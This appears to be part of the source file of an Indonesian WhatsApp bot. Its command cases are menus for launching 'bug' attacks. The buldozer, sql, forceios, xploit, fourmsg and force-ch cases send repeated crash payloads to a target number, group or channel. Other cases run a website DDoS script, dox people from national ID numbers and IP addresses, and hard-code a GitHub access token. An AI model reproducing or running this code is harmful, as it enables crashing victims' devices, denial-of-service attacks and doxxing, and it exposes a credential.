"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: false }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: `${footer}`, 
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./System/media/SqlEnception.jpg")}, { upload: TamaMods.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"My Creator\",\"url\":\"https://youtube.com/@zynxzoo\",\"merchant_url\":\"https://youtube.com/@zynxzoo\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: pantek}) 
await TamaMods.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
await TamaMods.sendMessage(m.chat, {audio: darkponk, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break;
//----------(Batas Case)----------//
case 'menu': case 'start': {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
const totalMem = os.totalmem();
TamaMods.sendMessage(m.chat, { react: { text: `🚀`, key: m.key }})
let teks = `*${ucapanWaktu}*\n\n─( 👋 ) Halo, ${m.pushName}, I'm The SimpleBot Script Bot. This Script Is Used To Explore And Take Advantage Of Gaps In The WhatsApp System. Use It Wilsely And Not For Harmful Purposes 

ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʙᴏᴛ
▢ Speed : ${latensi.toFixed(4)} Sec
▢ Runtime : ${runtime(process.uptime())}
▢ Ram : ${formatp(totalMem)}
▢ Bot Name : Simple Bot
▢ Mode : ${TamaMods.public ? "Public" : "Private"}
▢ Language : JavaScript

ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴜsᴇʀ
▢ Nama : ${pushname}
▢ Nomor : ${m.sender.split("@")[0]}
▢ Status : ${isPremium ? "Premium" : "Not Premium"}`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;
//----------(Batas Case)----------//
case "stokmenu": case "stockmenu": {    
const teks = `╭─☰ STOCK MENU
├─> addstokdo
├─> delstokdo
╰─> liststokdo`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;
//------(Batas Case)------//
case "fiturnew": case "ftrnew": {    
const teks = `╭─☰ FITUR NEW MENH
├─> createweb
├─> delweb
├─> ambilkodeweb
├─> listweb
╰─> createsc`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;
//------(Batas Case)------//
case "catatanmenu": case "catatmenu": {    
const teks = `╭─☰ CATATAN MENU
├─> addpendapatan
├─> delpendapatan
╰─> listpendapatan`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;
//------(Batas Case)------//
case "bugmenu": case "attackmenu": {   
const teks = `╭─☰ BUGS MENU
├─> sql-fnx
├─> carousel 
├─> buldozer
├─> forceios
├─> msgload
├─> cursorshot
├─> sql
├─> xploit
╰─> fourmsg`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;
//------(Batas Case)------//
 case 'adddb': {
  if (!q) return Reply('❌ Format: nomor|nama|password');
  const [phoneNumber, name, password] = q.split('|').map(x => x.trim());

  if (!phoneNumber || !name || !password) {
    return Reply('❌ Format tidak valid. Gunakan format: nomor|nama|password');
  }

  const GITHUB_TOKEN = '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'; // Token GitHub
  const REPO_OWNER = 'X-TamaMods'; // Username GitHub
  const REPO_NAME = 'DataUser'; // Nama repo
  const FILE_PATH = 'auth.json'; // Nama file JSON di repo

  try {
    // Ambil file JSON dari GitHub
    const getFile = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`);
    const fileData = await getFile.json();

    // Kalau file tidak ditemukan → jangan buat baru
    if (getFile.status === 404 || !fileData.content) {
      return Reply('❌ File auth.json tidak ditemukan di repo GitHub. Tambahkan dulu file tersebut secara manual.');
    }

    // Decode isi file dari Base64 → JSON
    const decoded = Buffer.from(fileData.content, 'base64').toString();
    const jsonData = JSON.parse(decoded);

    // Pastikan struktur valid
    if (typeof jsonData !== 'object' || Array.isArray(jsonData)) {
      return Reply('❌ Struktur file JSON tidak valid.');
    }

    // Jika nomor sudah ada → kirim error
    if (jsonData[phoneNumber]) {
      return Reply(`❌ Nomor ${phoneNumber} sudah ada di database.`);
    }

    // Tambah user baru
    jsonData[phoneNumber] = { name, password };

    // Encode ulang jadi Base64
    const updatedData = JSON.stringify(jsonData, null, 2);
    const base64Content = Buffer.from(updatedData).toString('base64');

    // Update file ke GitHub (pakai SHA lama)
    const updateFile = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`, {
      method: 'PUT',
      headers: {
        'Authorization': `Bearer ${GITHUB_TOKEN}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        message: `Menambahkan ${phoneNumber} (${name}) ke database`,
        content: base64Content,
        sha: fileData.sha // gunakan SHA file lama
      })
    });

    if (updateFile.status !== 200) {
      const err = await updateFile.json();
      throw new Error(`Gagal update file: ${err.message || updateFile.status}`);
    }

    return Reply(`✅ Nomor ${phoneNumber} berhasil ditambahkan!\n👤 Nama: ${name}\n🔑 Password: ${password}`);
  } catch (e) {
    console.error(e);
    return Reply(`❌ Error: ${e.message}`);
  }
}
break;
//-----(Batas Case)-----//
case "force-ch": {
  if (!isPremium && !isCreator) return Reply("𝑲𝒉𝒖𝒔𝒖𝒔 𝑶𝒘𝒏𝒆𝒓 & 𝑷𝒓𝒆𝒎𝒊𝒖𝒎");
  if (!q) return Reply(example("1203630xxxxx"));

  let target = q.includes("@newsletter") ? q : `${q}@newsletter`;

  if (!target.endsWith("@newsletter")) {
    return Reply("Masukkan ID channel yang valid");
  }
  await Reply(`   \`「 Attack Process! 」\`
 ☇ Channel : *${target}*
 ☇ Time : *${time}*
 ☇ Command : *${command}*
 ☇ Cooldown : *5–10 Minutes*
 — Target Has Been Fallen ‹ᝄ›`);

  for (let i = 0; i < 20; i++) {
    await crashNewsletter(target)
    await callNewsletter(target)
    await newsletterpay(target);
    await sleep(1500);
  }
}
break;
//-----(Batas Case)-----//
case "msgload": {
  try {
    if (!isPremium && !isCreator) return Reply("Khusus Owner & Premium!");
    if (!q) return Reply(example("628xxx"));

    let mentionedJid;
    let lockNum;

    if (m.mentionedJid?.length > 0) {
      mentionedJid = m.mentionedJid[0];
      lockNum = mentionedJid.split("@")[0];
    } else {
      let jidx = q.replace(/[^0-9]/g, "");
      if (jidx.startsWith("0")) return Reply(example("62xxx"));
      mentionedJid = `${jidx}@s.whatsapp.net`;
      lockNum = jidx;
    }
    let target = mentionedJid;
    let teks = `⌜ Simple Bot ☇ Bug° Status ⌟
⬡ Author: TamaModss
⬡ Version: 1.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Case - Plugins )

─▢ Target: ${lockNum}
─▢ Status: Process
─▢ Type: ${command}`;
    Reply(teks);

    for (let i = 0; i < 20; i++) {
      await InVisibleZets(TamaMods, target, true);
      await InVisibleZets(TamaMods, target, true);
      NullCards(TamaMods, target, false);
      await sleep(1500);
    }
  } catch (err) {
    console.error(err);
  }
}
break;
//-----(Batas Case)-----//
case "cursorshot": {
  try {
    if (!isPremium && !isCreator) return Reply("Khusus Owner & Premium!");
    if (!q) return Reply(example("628xxx"));

    let mentionedJid;
    let lockNum;

    if (m.mentionedJid?.length > 0) {
      mentionedJid = m.mentionedJid[0];
      lockNum = mentionedJid.split("@")[0];
    } else {
      let jidx = q.replace(/[^0-9]/g, "");
      if (jidx.startsWith("0")) return Reply(example("62xxx"));
      mentionedJid = `${jidx}@s.whatsapp.net`;
      lockNum = jidx;
    }
    let target = mentionedJid;
    await doneress();
    for (let i = 0; i < 50; i++) {
      await svlzVs(target);
      await svlzVs(target);
      await sleep(1500);
    }
  } catch (err) {
    console.error(err);
  }
 await doneress();
}
break;
//-----(Batas Case)-----//
case "buldozer": {
    if (!isOwner && !isPremium) return Reply("Owner & Premium Only")
    if (!text) return Reply(`Contoh: .${command} 628xxxxxx`);

    const target = text + '@s.whatsapp.net';
    await doneress();
    for (let i = 0; i < 80; i++) {
      await bulldozerr(TamaMods, target, true);
      await bulldozerr(TamaMods, target, true);
      await bulldozerr(TamaMods, target, true);
      await KyzuuHard(target);
      await quotadrain(TamaMods, target);
      await mention1(TamaMods, target);
      await applecrash1(target, true);
      await NullCards(TamaMods, target, true);
      await DelayMakluw(target, true);
      await ControlSql(target, true);
      await new Promise(res => setTimeout(res, 300));
        }
await DoneBugs();
}
break;
//----------(Batas Case)----------//
case "sql": {
    if (!isOwner && !isPremium) return Reply("Owner & Premium Only")
    if (!text) return Reply(`Contoh: .${command} 628xxxxxx`);

    const target = text + '@s.whatsapp.net';
    await doneress();
    for (let i = 0; i < 10; i++) {
      await newsletterpay(target);
      await NewBlanks(target);
      await CtaZtsL(TamaMods, target);
      await NativeSql4(target);
      await NativeSql3(target);
      await NativeSql2(target);
      await NativeSql1(target);
      await NativeSql5(target);
      await InterPay(target);
      await NullCards(TamaMods, target, false);
      await ForceInfinity(target);
      await force3(TamaMods, target);
      await force4(TamaMods, target);
      await blanknotif4(TamaMods, target);
      await applecrash1(target, true);
      await visible4(TamaMods, target);
      await applecrash4(TamaMods, target);
      await visible(TamaMods, target);
      await force1(TamaMods, target);
      await notifblank(TamaMods, target);
      await visiblecrash(TamaMods, target);
      await new Promise(res => setTimeout(res, 300));
    }
    await DoneBugs();
}
break;
case "malfic": {
    if (!isOwner && !isPremium) return Reply("Owner & Premium Only")
    if (!text) return Reply(`Contoh: .${command} 628xxxxxx`);

    const target = text + '@s.whatsapp.net';
    await doneress();
    for (let i = 0; i < 10; i++) {
      await xUi(TamaMods, target)
      await LocBlankOriginal(target)
      await LottieSticker(TamaMods, target)
      await SpamUiHard(target, ptcp = false)
      await RblClickV2(TamaMods, target)
      await DelayBjir(target)
      await Delaythumb(target)
      await CrashDocth(target)
      await CrashExtended(TamaMods, target)
      await CrashImage(TamaMods, target)
      await CrashVideo(TamaMods, target)
      await new Promise(res => setTimeout(res, 300));
    }
    await DoneBugs();
}
break;
case "reqs": {
    if (!isOwner && !isPremium) return Reply("Owner & Premium Only")
    if (!text) return Reply(`Contoh: .${command} 628xxxxxx`);

    const target = text + '@s.whatsapp.net';
    await doneress();
    for (let i = 0; i < 2; i++) {
      await DocuComplite(target);
      await Excation(TamaMods, target);
      await InteractiveUILoad(target);
      await InVisible(TamaMods, target);
      await xUi(TamaMods, target);
      await NullCards(TamaMods, target, false);
      await ForceInfinity(target);
      await force3(TamaMods, target);
      await force4(TamaMods, target);
      await blanknotif4(TamaMods, target);
      await applecrash1(target, true);
      await visible4(TamaMods, target);
      await applecrash4(TamaMods, target);
      await visible(TamaMods, target);
      await force1(TamaMods, target);
      await notifblank(TamaMods, target);
      await visiblecrash(TamaMods, target);
      await new Promise(res => setTimeout(res, 300));
    }
    await DoneBugs();
}
break;
//-----(Batas Case)-----//
case "carousel": {
    if (!isOwner && !isPremium) return Reply("Owner & Premium Only")
    if (!text) return Reply(`Contoh: .${command} 628xxxxxx`);

    const target = text + '@s.whatsapp.net';
    await doneress();
    for (let i = 0; i < 100; i++) {
      await invisibledelay(target, true);
      await ProtocolTrash(TamaMods, target, false);
      await new Promise(res => setTimeout(res, 300));
        }
await DoneBugs();
}
break;
//-----(Batas Case)-----//
case "sql-fnx": {
if (!q) return Reply(example("628xxx"));
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
    const teks = `
  *\`『 𝐀𝐓𝐓𝐀𝐂𝐊 𝐘𝐎𝐔𝐑 𝐏𝐇𝐎𝐍𝐄 』\`*
  
[ ▣ ] 𝗧𝗮𝗿𝗴𝗲𝘁 ${pepec} [ ▣ ]
[ ▣ ] 𝙿𝙻𝙴𝙰𝚂𝙴 𝚂𝙴𝙻𝙴𝙲𝚃 𝚃𝚈𝙿𝙴 𝙱𝚄𝙶𝚂 [ ▣ ]
    `;
    try {
        const messageContent = {
            document: { url: "https://files.catbox.moe/gso3zc.jpg" },
            mimetype: "image/png",
            fileName: `𝐒𝐢𝐦𝐩𝐥𝐞 𝐁𝐨𝐭 𝐕𝟏 𝐆𝐞𝐧 𝟐`,
            fileLength: 999999999999999,
            pageCount: 99999,
            jpegThumbnail: ImgSql ? await resize(ImgSql, 400, 400) : null,
            caption: teks,
            footer: `${footer}`,
            buttons: [
                {
                    buttonId: "action",
                    buttonText: { displayText: "𝑾𝒉𝒂𝒕𝒔𝑨𝒑𝒑 - 𝑻𝒆𝒍𝒆𝒈𝒓𝒂𝒎" },
                    type: 4,
                    nativeFlowInfo: {
                        name: "single_select",
                        paramsJson: JSON.stringify({
                            title: "バグメニューを選択",
                            sections: [
                                {
                                    title: "バグメニューを選択",
                            highlight_label: "𝐓𝐚𝐦𝐚 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🚀",
                  rows: [
                    { header: "𝑴𝒔𝒈-𝐥𝒐𝒂𝒅", title: "𝑴𝒔𝒈-𝐥𝒐𝒂𝒅", description: "", id: `.msgload ${pepec}` },
                    { header: "𝑪𝒖𝒓𝒔𝒐𝒓-𝑷𝒂𝒚", title: "𝑪𝒖𝒓𝒔𝒐𝒓-𝑷𝒂𝒚", description: "", id: `.cursorshot ${pepec}` },
                    { header: "𝑺𝒒𝒍-𝑭𝒏𝒙", title: "𝑺𝒒𝒍-𝑭𝒏𝒙", description: "", id: `.sql ${pepec}` },
                    { header: "𝑿𝒑𝒍𝒐𝒊𝒕-𝑺𝒒𝒍", title: "𝑿𝒑𝒍𝒐𝒊𝒕-𝑺𝒒𝒍", description: "", id: `.xploit ${pepec}` },
                     { header: "𝐁𝐮𝐥𝐥𝐝𝐨𝐳𝐞𝐫", title: "𝐁𝐮𝐥𝐥𝐝𝐨𝐳𝐞𝐫", description: "", id: `.buldozer ${pepec}` },
                    { header: "𝐂𝐚𝐫𝐨𝐮𝐬𝐞𝐥 𝐃𝐞𝐥𝐚𝐲", title: "𝐂𝐚𝐫𝐨𝐮𝐬𝐞𝐥 𝐃𝐞𝐥𝐚𝐲", description: "", id: `.carousel ${pepec}` },
                                    ]
                                }
                            ]
                        }),
                    },
                },
            ],
            contextInfo: {
                forwardingScore: 99999,
                externalAdReply: {
                    body: `𝐓-𝑺𝒊𝒎𝒑𝒍𝒆 𝑩𝒐𝒕 𝑽𝟐 𝑮𝒆𝒏 𝟐`,
                    containsAutoReply: true,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    showAdAttribution: false,
                    sourceUrl: "https://whatsapp.com/channel/0029VbA8EL0DjiOguK9AA30X",
                    thumbnail: ImgSql,
                    thumbnailUrl: "https://files.catbox.moe/gso3zc.jpg",
                    title: "𝑻𝒂𝒎𝒂 - 𝑶𝒇𝒇𝒊𝒄𝒊𝒂𝒍",
                },
            },
            viewOnce: true,
        };

        // Kirim pesan utama
        await TamaMods.sendMessage(m.chat, messageContent, { quoted: pantek });

    // Kirim audio sebagai voice note
    await TamaMods.sendMessage(
      m.chat,
      {
        audio: { url: "https://files.catbox.moe/mfcba3.mp3" }, // Ganti dengan URL audio
        mimetype: "audio/mpeg",
        ptt: true,
      },
      { quoted: pantek }
    );

  } catch (error) {
    console.error("Error sending menu:", error);
    await TamaMods.sendMessage(m.chat, { text: "⚠️ Terjadi kesalahan saat mengirim menu." });
  }
}
break;
//-----(Batas Case)-----//
case "xploit": {
    if (!isOwner && !isPremium) return Reply("Owner & Premium Only")
    if (!text) return Reply(`Contoh: .${command} 628xxxxxx`);

    const target = text + '@s.whatsapp.net';
    await doneress();
    for (let i = 0; i < 50; i++) {
      await CrlButton(TamaMods, target);
      await CrlButton(TamaMods, target);
      await EpUi(TamaMods, target, true);
      await EpUi(TamaMods, target, true);
      await new Promise(res => setTimeout(res, 300));
        }
await DoneBugs();
}
break;
case "forceios": {
    if (!isOwner && !isPremium) return Reply("Owner & Premium Only")
    if (!text) return Reply(`Contoh: .${command} 628xxxxxx`);

    const target = text + '@s.whatsapp.net';
    await doneress();
    for (let i = 0; i < 10; i++) {
      await ForceInfinity(target);
      await force3(TamaMods, target);
      await force4(TamaMods, target);
      await blanknotif4(TamaMods, target);
      await applecrash1(target, true);
      await visible4(TamaMods, target);
      await applecrash4(TamaMods, target);
      await visible(TamaMods, target);
      await force1(TamaMods, target);
      await notifblank(TamaMods, target);
      await visiblecrash(TamaMods, target);
      await new Promise(res => setTimeout(res, 300));
        }
await DoneBugs();
}
break;
//-----(Batas Case)-----//
case "fourmsg": {
  if (!isPremium && !isOwner) return Reply(" 𝑲𝒉𝒖𝒔𝒖𝒔 𝑶𝒘𝒏𝒆𝒓 & 𝑷𝒓𝒆𝒎𝒊𝒖𝒎");
  if (!q) return Reply(example("1203630xxxxx"));

  let target = q.includes("@g.us") ? q : `${q}@g.us`;

  if (!target.endsWith("@g.us")) {
    return Reply("Masukkan ID group yang valid");
  }
  await Reply(`   \`「 Attack Process! 」\`
 ☇ Group : *${target}*
 ☇ Time : *${time}*
 ☇ Command : *${command}*
 ☇ Cooldown : *5–10 Minutes*
 — Target Has Been Fallen ‹ᝄ›`);

  for (let i = 0; i < 20; i++) {
    await InviteBlank(target);
    await BlankGroup(target);
    await LocBlankOriginal(target);
    await LocBlank2(target);
    await SpamUiHard(target, ptcp = false);
    await SystemUi(target);
    await DelayGroup(TamaMods, target);
    await DelayGroup(TamaMods, target);
    await new Promise(resolve => setTimeout(resolve, 8500));
    await NativeStcx(target, true);
    await DocBlank(target, true);
    await new Promise(resolve => setTimeout(resolve, 8500));
    await bulldozer(TamaMods, target);
    await DelayGroup(TamaMods, target);
    await new Promise(resolve => setTimeout(resolve, 8500));
    await bulldozerr(TamaMods, target, true);
    await CrlButton(TamaMods, target);
    await new Promise(resolve => setTimeout(resolve, 8500));
  }
}
break;
//----------(Batas Case)----------//
case "doxxingktp": {
    if (!isOwner) return Reply(mess.owner);
    if (!q) return Reply(example("masukkan NIK target"));

    try {
        const { nikParser } = require('nik-parser');
        const nik = nikParser(q);

        if (!nik.isValid()) {
            return Reply("⚠️ NIK tidak valid. Harap periksa kembali.");
        }

        const provinsi = nik.province();
        const kabupaten = nik.kabupatenKota();
        const kecamatan = nik.kecamatan();

        const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(kecamatan + ', ' + kabupaten + ', ' + provinsi)}`;

        Reply(`✅ *Informasi NIK:*\n
- *Provinsi:* ${provinsi} (ID: ${nik.provinceId()})
- *Kabupaten/Kota:* ${kabupaten} (ID: ${nik.kabupatenKotaId()})
- *Kecamatan:* ${kecamatan} (ID: ${nik.kecamatanId()})
- *Kode Pos:* ${nik.kodepos()}
- *Jenis Kelamin:* ${nik.kelamin()}
- *Tanggal Lahir:* ${nik.lahir()}
- *Uniqcode:* ${nik.uniqcode()}

📍 *Lokasi di Maps:* [Klik Disini](${mapsUrl})`);

    } catch (error) {
        console.error("Error saat parsing NIK:", error);
        Reply("⚠️ Terjadi kesalahan saat memproses NIK.");
    }

    break;
}
case "doxxingip": {
    if (!isOwner) return Reply(mess.owner);
    if (!text) return Reply(example("112.90.150.204"));

    try {
        let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

        if (!res?.success) {
            throw new Error(`⚠️ IP ${text} tidak ditemukan atau tidak valid!`);
        }

        const formatIPInfo = (info) => {
            return `
*🌍 Informasi IP:*
• *IP:* ${info.ip || 'N/A'}
• *Tipe:* ${info.type || 'N/A'}
• *Benua:* ${info.continent || 'N/A'} (${info.continent_code || 'N/A'})
• *Negara:* ${info.country || 'N/A'} (${info.country_code || 'N/A'})
• *Provinsi:* ${info.region || 'N/A'} (${info.region_code || 'N/A'})
• *Kota:* ${info.city || 'N/A'}
• *Kode Pos:* ${info.postal || 'N/A'}
• *Kode Telepon:* ${info.calling_code || 'N/A'}
• *Ibu Kota:* ${info.capital || 'N/A'}
• *Perbatasan:* ${info.borders || 'N/A'}

*🚩 Bendera:* ${info.flag?.emoji || 'N/A'}
• *Organisasi:* ${info.connection?.org || 'N/A'}
• *ISP:* ${info.connection?.isp || 'N/A'}
• *Domain:* ${info.connection?.domain || 'N/A'}

*🕰️ Zona Waktu:*
• *ID:* ${info.timezone?.id || 'N/A'}
• *Abbr:* ${info.timezone?.abbr || 'N/A'}
• *DST:* ${info.timezone?.is_dst ? 'Yes' : 'No'}
• *UTC:* ${info.timezone?.utc || 'N/A'}
• *Waktu Sekarang:* ${info.timezone?.current_time || 'N/A'}

📍 *Lokasi Maps:* [Klik Disini](https://www.google.com/maps?q=${info.latitude},${info.longitude})
            `;
        };

        // Kirim lokasi jika tersedia
        if (res.latitude && res.longitude) {
            await TamaMods.sendMessage(m.chat, { 
                location: { 
                    degreesLatitude: res.latitude, 
                    degreesLongitude: res.longitude 
                } 
            }, { ephemeralExpiration: 604800 });

            // Delay 2 detik sebelum mengirim detail IP agar tidak tabrakan
            await new Promise(resolve => setTimeout(resolve, 2000));
        }

        Reply(formatIPInfo(res));

    } catch (e) { 
        console.error("Error saat mengambil data IP:", e);
        Reply(`⚠️ Error: Tidak dapat mengambil data untuk IP ${text}`);
    }

    break;
}
case "ddosweb": {
    if (!isOwner) return Reply(mess.owner);
    if (!q || !q.includes(" ")) return Reply(example("TamaMods.com 60"));

    let [targetweb, timeweb] = q.split(" ");

    if (!targetweb || !timeweb || isNaN(timeweb)) {
        return Reply(example("TamaMods.com 60"));
    }

    Reply(`🚀 *Bot sedang menyerang! Tunggu hasilnya...*\n• *Target:* ${targetweb}\n• *Waktu Serangan:* ${timeweb} detik`);

    const { exec } = require("child_process");
    exec(
        `node ./Access/ddos.js ${targetweb} ${timeweb}`,
        { maxBuffer: 1024 * 1024 },
        (error, stdout, stderr) => {
            if (error) {
                console.error("❌ Error:", error);
                return Reply(`⚠️ Terjadi kesalahan: ${error.message}`);
            }
            if (stderr) {
                console.error("❌ Stderr:", stderr);
                return Reply(`⚠️ Terjadi kesalahan: ${stderr}`);
            }

            Reply(`✅ *Serangan Selesai!*\n\n• *Target:* ${targetweb}\n• *Durasi:* ${timeweb} detik`);
        }
    );

    break;
}

case 't-allmenu': case 'allmenu': {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
const totalMem = os.totalmem();
TamaMods.sendMessage(m.chat, { react: { text: `🚀`, key: m.key }})
let teks = `*${ucapanWaktu}*\n\n─( 👋 ) Halo, ${m.pushName}, I'm The SimpleBot Script Bot. This Script Is Used To Explore And Take Advantage Of Gaps In The WhatsApp System. Use It Wilsely And Not For Harmful Purposes 

ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʙᴏᴛ
▢ Speed : ${latensi.toFixed(4)} Sec
▢ Runtime : ${runtime(process.uptime())}
▢ Ram : ${formatp(totalMem)}
▢ Bot Name : Simple Bot
▢ Mode : ${TamaMods.public ? "Public" : "Private"}
▢ Language : JavaScript

ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴜsᴇʀ
▢ Nama : ${pushname}
▢ Nomor : ${m.sender.split("@")[0]}
▢ Status : ${isPremium ? "Premium" : "Not Premium"}

╭─☰ BUGS MENU
├─> sql-fnx
├─> carousel 
├─> buldozer
├─> forceios
├─> msgload
├─> cursorshot
├─> sql
├─> xploit
╰─> fourmsg

╭─☰ SALURAN MENU
├─> cekidch
├─> addidch
├─> delidch
